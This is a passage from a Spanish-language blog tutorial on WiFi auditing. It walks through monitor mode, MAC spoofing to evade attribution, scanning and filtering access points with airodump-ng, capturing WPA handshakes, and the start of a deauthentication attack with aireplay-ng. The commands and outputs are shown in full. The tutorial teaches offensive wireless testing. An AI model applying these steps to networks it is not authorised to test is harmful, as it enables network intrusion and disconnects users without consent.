‘&lt;strong&gt;wpa_supplicant&lt;/strong&gt;’?, es algo absurdo, e incluso la propia suite nos lo recuerda… pues se encargan de darnos
conectividad y mantenernos con conexión en una red ya estando asociados, lo cual en este caso… no aplica.&lt;/p&gt;

&lt;p&gt;Matar estos procesos es sencillo, tenemos la siguiente forma:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#pkill dhclient &amp;amp;&amp;amp; pkill wpa_supplicant&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;O si deseamos tirar de la propia suite:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airmon-ng check kill&lt;/span&gt;

Killing these processes:

  PID Name
  835 wpa_supplicant
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Ya con esto, nuestra tarjeta de red está en modo monitor. Una forma de comprobar si estamos en modo monitor es
listando nuestras interfaces de red. Ahora nuestra red &lt;strong&gt;wlan0&lt;/strong&gt; debería llamarse &lt;strong&gt;wlan0mon&lt;/strong&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ifconfig | grep wlan0 -A 6&lt;/span&gt;
wlan0mon: &lt;span class=&quot;nv&quot;&gt;flags&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;4163&amp;lt;UP,BROADCAST,RUNNING,MULTICAST&amp;gt;  mtu 1500
        unspec E4-70-B8-D3-93-5C-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;UNSPEC&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX packets 63  bytes 12032 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;11.7 KiB&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        RX errors 0  dropped 63  overruns 0  frame 0
        TX packets 0  bytes 0 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;0.0 B&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Una vez llegados a este punto, se podría decir que ya somos capaces de capturar todos los paquetes que viajan
por nuestro alrededor, pero dejaremos esto para el siguiente punto.&lt;/p&gt;

&lt;p&gt;Importante, ¿cómo desactivar el modo monitor y hacer que todo vuelva a la normalidad en términos de
conectividad?, sencillo. Podemos hacer uso de los siguientes comandos para restablecer la conexión:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#airmon-ng stop wlan0mon &amp;amp;&amp;amp; service network-manager restart&lt;/span&gt;

PHY	Interface	Driver		Chipset

phy0	wlan0mon	iwlwifi		Intel Corporation Wireless 7265 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;rev 61&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 station mode vif enabled on &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

		&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;mac80211 monitor mode vif disabled &lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;phy0]wlan0mon&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;

┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ping -c 10 -i 0.01 -q google.es&lt;/span&gt;
PING google.es &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;172.217.17.3&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; 56&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;84&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; bytes of data.

&lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt; google.es ping statistics &lt;span class=&quot;nt&quot;&gt;---&lt;/span&gt;
10 packets transmitted, 10 received, 0% packet loss, &lt;span class=&quot;nb&quot;&gt;time &lt;/span&gt;309ms
rtt min/avg/max/mdev &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; 28.718/29.565/29.985/0.427 ms, pipe 3
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por lo que fuera malestares y preocupaciones, no hay que tirar el ordenador a la basura.&lt;/p&gt;

&lt;p&gt;Pero esto no es suficiente. A pesar de no estar conectados a ninguna red y no disponer de direccion IP, lo que
en sí puede dejar rastro es nuestra dirección MAC.&lt;/p&gt;

&lt;p&gt;La dirección MAC al fin y al cabo es como el DNI de cada dispositivo, es lo que identifica un dispositivo
móvil, un router, un ordenador, etc. Sería feo estar haciendo cierto tipo de ataques actuando bajo una
dirección MAC que se nos asocie, es lo equivalente a hacer un atraco con pasamontañas pero llevar una cartera
con nuestro DNI dentro del bolsillo y que en un descuido se nos caiga al suelo quedando a la exposición de
todos los demás.&lt;/p&gt;

&lt;p&gt;Una buena practica consiste en falsificar la dirección MAC, y no hace falta saber de electrónica o Hardware
para ello. A través de la utilidad &lt;strong&gt;macchanger&lt;/strong&gt;, podemos jugar con la dirección MAC de nuestro dispositivo
para manipularla a nuestro antojo.&lt;/p&gt;

&lt;p&gt;Por ejemplo, imaginemos que quiero asignar a mi tarjeta de red una dirección MAC de la &lt;strong&gt;NATIONAL SECURITY
AGENCY&lt;/strong&gt; (&lt;strong&gt;NSA&lt;/strong&gt;), ¿cómo se procedería?. Primero buscamos la dirección MAC en el amplio listado del que
dispone ‘macchanger’:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#macchanger -l | grep -i &quot;national security agency&quot;&lt;/span&gt;
8310 - 00:20:91 - J125, NATIONAL SECURITY AGENCY
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Estos tres primeros pares listados corresponden a lo que se conoce como &lt;strong&gt;Organizationally Unique
Identifier&lt;/strong&gt;, un simple número de 24 bits que identifica al vendor, manufacturer u otra organización.&lt;/p&gt;

&lt;p&gt;Una dirección MAC está compuesta por 6 bytes, ya tenemos los primeros 3 bytes, ¿qué hay de los otros 3 bytes?.
Los 24 bits restantes corresponden a lo que se conoce como &lt;strong&gt;Universally Administered Address&lt;/strong&gt;, y sinceramente…
en mis prácticas, siempre me la invento.&lt;/p&gt;

&lt;p&gt;Es decir, que si quisiera falsificar una dirección MAC registrada bajo el &lt;strong&gt;OUI&lt;/strong&gt; de la NSA, podría hacer lo
siguiente:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ifconfig wlan0mon down&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo &quot;$(macchanger -l | grep -i &quot;national security agency&quot; | awk '{print $3}'):da:1b:6a&quot;&lt;/span&gt;
00:20:91:da:1b:6a
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#macchanger --mac=$(!!) wlan0mon&lt;/span&gt;
Current MAC:   e4:70:b8:d3:93:5c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Permanent MAC: e4:70:b8:d3:93:5c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
New MAC:       00:20:91:da:1b:6a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;J125, NATIONAL SECURITY AGENCY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ifconfig wlan0mon up&lt;/span&gt;
┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#macchanger -s wlan0mon&lt;/span&gt;
Current MAC:   00:20:91:da:1b:6a &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;J125, NATIONAL SECURITY AGENCY&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
Permanent MAC: e4:70:b8:d3:93:5c &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;unknown&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Aspectos a tener en cuenta de lo anterior:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;
    &lt;p&gt;Es necesario dar de baja la interfaz de red para manipular su dirección MAC, pues de lo contrario el propio
‘macchanger’ nos avisará de que es necesario darla de baja.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Con la utilidad ‘–mac’, podemos especificar la dirección MAC a utilizar para la interfaz de red
especificada.&lt;/p&gt;
  &lt;/li&gt;
  &lt;li&gt;
    &lt;p&gt;Una vez aplicados los cambios, damos de alta la interfaz y con el parámetro ‘-s’ (&lt;strong&gt;show&lt;/strong&gt;), validamos que
nuestra tarjeta de red corresponde al &lt;strong&gt;OUI&lt;/strong&gt; asignado.&lt;/p&gt;
  &lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Perfecto, si has llegado a este punto podemos continuar.&lt;/p&gt;

&lt;h3 id=&quot;análisis-del-entorno&quot;&gt;Análisis del entorno&lt;/h3&gt;

&lt;p&gt;Llega el momento interesante. Ahora que estamos en modo monitor, para capturar todos los paquetes de nuestro
alrededor, podemos hacer uso del siguiente comando:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;airodump-ng wlan0mon
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANTE&lt;/strong&gt;: Aunque tal vez lo debería haber mencionado en el anterior punto, no todas las tarjetas de red
tienen por qué llamarse &lt;strong&gt;wlan0&lt;/strong&gt;, pueden tener un nombre distinto (Ej: &lt;strong&gt;wlp2s0&lt;/strong&gt;), por lo que habrá que
tener en cuenta su nombre para acompañarlo junto al comando a aplicar.&lt;/p&gt;

&lt;p&gt;Al correr el comando citado anteriormente, obtenemos el siguiente resultado:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH 13 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 18 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  &lt;span class=&quot;nt&quot;&gt;-59&lt;/span&gt;       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  &lt;span class=&quot;nt&quot;&gt;-79&lt;/span&gt;       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  &lt;span class=&quot;nt&quot;&gt;-81&lt;/span&gt;       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  &lt;span class=&quot;nt&quot;&gt;-85&lt;/span&gt;       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  &lt;span class=&quot;nt&quot;&gt;-85&lt;/span&gt;       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  &lt;span class=&quot;nt&quot;&gt;-90&lt;/span&gt;        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  &lt;span class=&quot;nt&quot;&gt;-27&lt;/span&gt;    0 - 2e     0        1                                
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Entonces bien, ¿cómo se interpreta este output?.&lt;/p&gt;

&lt;p&gt;De los campos más importantes por el momento, por un lado tenemos el campo &lt;strong&gt;BSSID&lt;/strong&gt;, donde siempre podremos
corroborar cuál es la dirección MAC del punto de acceso. Por otro lado, contamos con el campo &lt;strong&gt;PWR&lt;/strong&gt;, donde a
modo de consideración, a más cerca esté del valor 0, podremos decir que más cerca nos situamos del AP.&lt;/p&gt;

&lt;p&gt;El campo &lt;strong&gt;CH&lt;/strong&gt;, indica el canal en el que se sitúa el AP. Cada AP, está posicionado en un canal distinto, con
el objetivo de evitar que se dañe el espectro de onda entre las múltiples redes del entorno. Existe un ataque
justamente de denegación de servicio, que se encarga de generar múltiples Fake AP’s situados en el mismo canal
que en el del AP objetivo, consiguiendo así que la red queda inoperativa temporalmente (lo veremos más
adelante).&lt;/p&gt;

&lt;p&gt;Por otro lado, los campos &lt;strong&gt;ENC, CIPHER&lt;/strong&gt; y &lt;strong&gt;AUTH&lt;/strong&gt;, donde podremos comprobar siempre con qué tipo de red
estamos tratando. La mayoría de redes domésticas cumplen la encriptación WPA/WPA, con cifrado CCMP y modo de
autenticación PSK.&lt;/p&gt;

&lt;p&gt;En el campo &lt;strong&gt;ESSID&lt;/strong&gt;, podremos siempre saber el nombre de la red con la que estamos tratando, pudiendo así en
una misma línea a través del campo &lt;strong&gt;BSSID&lt;/strong&gt; saber cuál es su dirección MAC, de utilidad para cuando
comencemos con la fase de filtrado.&lt;/p&gt;

&lt;p&gt;El campo &lt;strong&gt;DATA&lt;/strong&gt;, por el momento no lo tocaremos, ya que nos meteremos a fondo con este cuando tratemos las
redes de protocolo &lt;strong&gt;WEP&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;Asimismo, en la parte inferior, podemos ver otros datos que están siendo capturados con la herramienta. Esta
sección corresponde a la de los clientes. Consideraremos una estación como un cliente asociado. Para el
ejemplo mostrado, existe una estación con dirección MAC &lt;strong&gt;34:41:5D:46:D1:38&lt;/strong&gt; asociado al &lt;strong&gt;BSSID&lt;/strong&gt;
‘20:34:FB:B1:C5:53’, donde de manera inmediata en la parte superior podemos ver que se trata de la red
&lt;strong&gt;hacklab&lt;/strong&gt;, por lo que ya sabemos que dicha red cuenta con un cliente asociado.&lt;/p&gt;

&lt;p&gt;Es posible que en ocasiones lleguemos a capturar estaciones que no están asociadas a ningún punto de acceso,
el cual en este caso se indicará con un ‘&lt;strong&gt;not associated&lt;/strong&gt;’ en el campo &lt;strong&gt;BSSID&lt;/strong&gt;. Es a través del campo
&lt;strong&gt;Frames&lt;/strong&gt; de las estaciones, donde podremos ver qué tipo de actividad tiene el cliente sobre dicho AP. Si los
Frames aumentan considerablemente a intervalos cortos de tiempo, esto quiere decir que la estación se
encuentra activa en el momento de la captura.&lt;/p&gt;

&lt;h3 id=&quot;modos-de-filtro&quot;&gt;Modos de filtro&lt;/h3&gt;

&lt;p&gt;Aunque es una maravilla poder capturar todos los AP’s y estaciones de nuestro entorno, como atacante siempre
nos interesará atentar contra un AP específico. Por ello, introducimos en este punto los modos de filtro
disponibles desde la herramienta para capturar aquellos puntos de acceso deseados.&lt;/p&gt;

&lt;p&gt;Volvamos al caso de antes:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH 13 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 18 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-05 13:34                                         
                                                                                                                                                                                       
 BSSID              PWR  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  &lt;span class=&quot;nt&quot;&gt;-20&lt;/span&gt;       19        1    0   1  180  WPA2 CCMP   PSK  hacklab                                                                                                      
 1C:B0:44:D4:16:78  &lt;span class=&quot;nt&quot;&gt;-59&lt;/span&gt;       23       13    0  11  130  WPA2 CCMP   PSK  MOVISTAR_1677                                                                                                
 30:D3:2D:58:3C:6B  &lt;span class=&quot;nt&quot;&gt;-79&lt;/span&gt;       29        4    0  11  135  WPA2 CCMP   PSK  devolo-30d32d583c6b                                                                                          
 10:62:D0:F6:F7:D8  &lt;span class=&quot;nt&quot;&gt;-81&lt;/span&gt;       15        0    0   6  130  WPA2 CCMP   PSK  LowiF7D3                                                                                                     
 F8:8E:85:DF:3E:13  &lt;span class=&quot;nt&quot;&gt;-85&lt;/span&gt;       14        0    0   9  130  WPA  CCMP   PSK  Wlan1                                                                                                        
 FC:B4:E6:99:A9:09  &lt;span class=&quot;nt&quot;&gt;-85&lt;/span&gt;       17        0    0   1  130  WPA2 CCMP   PSK  MOVISTAR_A908                                                                                                
 28:9E:FC:0C:40:3E  &lt;span class=&quot;nt&quot;&gt;-90&lt;/span&gt;        2        0    0   6  195  WPA2 CCMP   PSK  vodafone4038                                                                                                 
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                        
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  &lt;span class=&quot;nt&quot;&gt;-27&lt;/span&gt;    0 - 2e     0        1  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Imaginemos que queremos filtrar para que sólo se lista el punto de acceso cuyo &lt;strong&gt;ESSID&lt;/strong&gt; es &lt;strong&gt;hacklab&lt;/strong&gt;, ¿qué
 podemos recaudar de primeras de esta red?&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;El AP se sitúa en el canal 1&lt;/li&gt;
  &lt;li&gt;El AP posee dirección MAC  20:34:FB:B1:C5:53&lt;/li&gt;
  &lt;li&gt;El AP posee ESSID hacklab&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Generalmente con 2 datos ya es suficiente para llevar a cabo el filtro. Para este caso, podríamos filtrar la
red en cuestión de las siguientes formas:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;airodump-ng -c 1 –essid hacklab wlan0mon&lt;/li&gt;
  &lt;li&gt;airodump-ng -c 1 –bssid  20:34:FB:B1:C5:53 wlan0mon&lt;/li&gt;
  &lt;li&gt;airodump-ng -c 1 –bssid  20:34:FB:B1:C5:53 –essid hacklab wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Para cualquiera de las formas representadas, obtendríamos los siguientes resultados:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH  1 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 0 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  &lt;span class=&quot;nt&quot;&gt;-26&lt;/span&gt; 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  &lt;span class=&quot;nt&quot;&gt;-26&lt;/span&gt;    0e- 6e     0        9                 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h3 id=&quot;exportación-de-evidencias&quot;&gt;Exportación de evidencias&lt;/h3&gt;

&lt;p&gt;Ahora bien, a efectos prácticos, nos encontramos en la misma situación que al principio. Como atacantes, lo
que nos interesa siempre es recolectar la información del AP objetivo. En este caso, estamos monitorizando el
tráfico del AP &lt;strong&gt;hacklab&lt;/strong&gt;, pero sin generar evidencias.&lt;/p&gt;

&lt;p&gt;Resulta más interesante capturar y exportar todo el tráfico que se monitorea a un fichero, con el propósito de
posteriormente poder analizarlo. Para ello se hace uso de la misma sintaxis pero incorporando el parámetro
‘&lt;strong&gt;-w&lt;/strong&gt;’, donde seguidamente especificamos el nombre del fichero:&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;airodump-ng -c 1 -w Captura –essid hacklab wlan0mon&lt;/li&gt;
  &lt;li&gt;airodump-ng -c 1 -w Captura –bssid  20:34:FB:B1:C5:53 wlan0mon&lt;/li&gt;
  &lt;li&gt;airodump-ng -c 1 -w Captura –bssid  20:34:FB:B1:C5:53 –essid hacklab wlan0mon&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;De esta forma, una vez comienza el escaneo, se generan los siguientes ficheros en nuestro directorio de
trabajo:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#ls&lt;/span&gt;
Captura-01.cap  Captura-01.csv  Captura-01.kismet.csv  Captura-01.kismet.netxml  Captura-01.log.csv
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Realmente, de todos estos ficheros, con el que la gran mayoría de veces trabajaremos es con el que tiene
extensión ‘.cap’, esto es así dando que es el que contendrá el ** Handshake** capturado, con el que trataremos
en breve.&lt;/p&gt;

&lt;h3 id=&quot;concepto-de-handshake&quot;&gt;Concepto de Handshake&lt;/h3&gt;

&lt;p&gt;Por cada vez que una estación se asocia o re-asocia a un AP, durante el proceso de asociación viaja la
contraseña del AP encriptada. A efectos prácticos, se dice siempre que el &lt;strong&gt;Handshake&lt;/strong&gt; en estos casos se
genera en el momento en el que un cliente se re-conecta a la red.&lt;/p&gt;

&lt;p&gt;Como estamos monitorizando todo el tráfico de la red en un fichero… viene de maravilla capturar una
re-asociación, pues esta autenticación dejará rastro en nuestra captura y seremos capaces de visualizar la
contraseña encriptada de la red.&lt;/p&gt;

&lt;p&gt;Podrías pensar, ¿entonces tengo que quedarme esperando hasta que por X razón una estación se re-asocie al AP?,
no exactamente. Ese tipo de escenario se le consideraría escenario pasivo, pues nosotros como atacantes no
estaríamos interviniendo para manipular el tráfico del AP.&lt;/p&gt;

&lt;p&gt;Existe un escenario activo, el cual pondremos en práctica, donde como atacantes somos capaces de elaborar
externamente sin estar asociados a un AP, un ataque de de-autenticación, consiguiendo así expulsar a uno o
múltiples clientes de una red inalámbrica sin consentimiento.&lt;/p&gt;

&lt;p&gt;Un Handshake al fin y al cabo quedará marcado como un Hash, el cual podremos extraer de la captura
posteriormente para iniciar un ataque de fuerza bruta.&lt;/p&gt;

&lt;h3 id=&quot;técnicas-para-capturar-un-handshake&quot;&gt;Técnicas para capturar un Handshake&lt;/h3&gt;

&lt;p&gt;A continuación, se representan distintas técnicas con el propósito de capturar un Handshake de la red fijada
como objetivo.&lt;/p&gt;

&lt;h4 id=&quot;ataque-de-deautenticación-dirigido&quot;&gt;Ataque de deautenticación dirigido&lt;/h4&gt;

&lt;p&gt;El protocolo IEEE 802.11 (Wi-Fi), contiene la provisión para un &lt;strong&gt;marco de deautenticación&lt;/strong&gt;. Como atacantes,
para este ataque lo que haremos será enviar un marco de deautenticación al punto de acceso inalámbrico
objetivo, especificando la dirección MAC del cliente que queremos que sea expulsado de la red.&lt;/p&gt;

&lt;p&gt;El proceso de enviar dicho marco al punto de acceso se denomina ‘&lt;strong&gt;Técnica autorizada para informar a una
estación no autorizada que se ha desconectado de la red&lt;/strong&gt;’.&lt;/p&gt;

&lt;p&gt;En otras palabras, estaríamos poniendo en práctica el siguiente esquema:&lt;/p&gt;

&lt;p&gt;&lt;img align=&quot;center&quot; src=&quot;https://funkyimg.com/i/2W6cB.png&quot; /&gt;&lt;/p&gt;

&lt;p&gt;Para retomar la captura por donde lo habíamos dejado, os vuelvo a representar el caso:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; CH  1 &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; Elapsed: 0 s &lt;span class=&quot;o&quot;&gt;][&lt;/span&gt; 2019-08-08 20:12                                         
                                                                                                                                                                                       
 BSSID              PWR RXQ  Beacons    &lt;span class=&quot;c&quot;&gt;#Data, #/s  CH  MB   ENC  CIPHER AUTH ESSID&lt;/span&gt;
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  &lt;span class=&quot;nt&quot;&gt;-26&lt;/span&gt; 100       29        7    3   1  180  WPA2 CCMP   PSK  hacklab                                                                                                  
                                                                                                                                                                                       
 BSSID              STATION            PWR   Rate    Lost    Frames  Probe                                                                                                             
                                                                                                                                                                                       
 20:34:FB:B1:C5:53  34:41:5D:46:D1:38  &lt;span class=&quot;nt&quot;&gt;-26&lt;/span&gt;    0e- 6e     0        9                 
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Por tanto, tenemos un cliente &lt;strong&gt;34:41:5D:46:D1:38&lt;/strong&gt; asociado al AP &lt;strong&gt;hacklab&lt;/strong&gt;. Tratemos de expulsarlo del
punto de acceso. Para expulsar al cliente, haremos uso de la utilidad de &lt;strong&gt;aireplay-ng&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;‘&lt;strong&gt;Aireplay-ng&lt;/strong&gt;’ cuenta con diferentes modos:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;┌─[root@parrot]─[/home/s4vitar/Desktop/Red]
└──╼ &lt;span class=&quot;c&quot;&gt;#echo; aireplay-ng --help | tail -n 13 | grep -v help | sed '/^\s*$/d' | sed 's/^ *//'; echo&lt;/span&gt;

&lt;span class=&quot;nt&quot;&gt;--deauth&lt;/span&gt;      count : deauthenticate 1 or all stations &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-0&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--fakeauth&lt;/span&gt;    delay : fake authentication with AP &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-1&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--interactive&lt;/span&gt;       : interactive frame selection &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-2&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--arpreplay&lt;/span&gt;         : standard ARP-request replay &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-3&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;--chopchop&lt;/span&gt;          : decrypt/chopchop WEP packet &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-4&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
